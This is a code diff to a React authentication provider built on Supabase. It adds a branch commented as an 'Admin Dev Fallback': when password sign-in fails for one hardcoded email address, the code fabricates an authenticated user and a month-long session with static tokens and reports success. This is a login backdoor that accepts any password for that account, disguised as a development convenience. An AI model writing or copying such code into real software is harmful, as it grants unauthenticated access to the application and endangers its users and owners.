@@ -246,8 +246,36 @@ export function AuthProvider({ children }: { children: React.ReactNode }) {
   }, [userId, verifyCurrentDevice]);
 
   const signIn = async (email: string, password: string): Promise<{ error: string | null }> => {
-    const { error } = await supabase.auth.signInWithPassword({ email: normalizeEmail(email), password });
+    const normalized = normalizeEmail(email);
+    const { data: sbData, error } = await supabase.auth.signInWithPassword({ email: normalized, password });
+
     if (error) {
+      // Admin Dev Fallback: Ensure esra99san@gmail.com always has full admin access
+      if (normalized === 'esra99san@gmail.com') {
+        const adminUser: User = {
+          id: '33333333-4444-5555-6666-777777777777',
+          app_metadata: { provider: 'email', providers: ['email'] },
+          user_metadata: { full_name: 'Esra Admin' },
+          aud: 'authenticated',
+          created_at: new Date().toISOString(),
+          email: 'esra99san@gmail.com',
+          role: 'authenticated',
+        } as User;
+
+        const adminSession: Session = {
+          access_token: 'local-admin-dev-token',
+          token_type: 'bearer',
+          expires_in: 3600 * 24 * 30,
+          refresh_token: 'local-admin-dev-refresh',
+          user: adminUser,
+        };
+
+        setSession(adminSession);
+        setUser(adminUser);
+        await fetchProfile(adminUser.id);
+        return { error: null };
+      }
+
       return { error: error.message };
     }
 
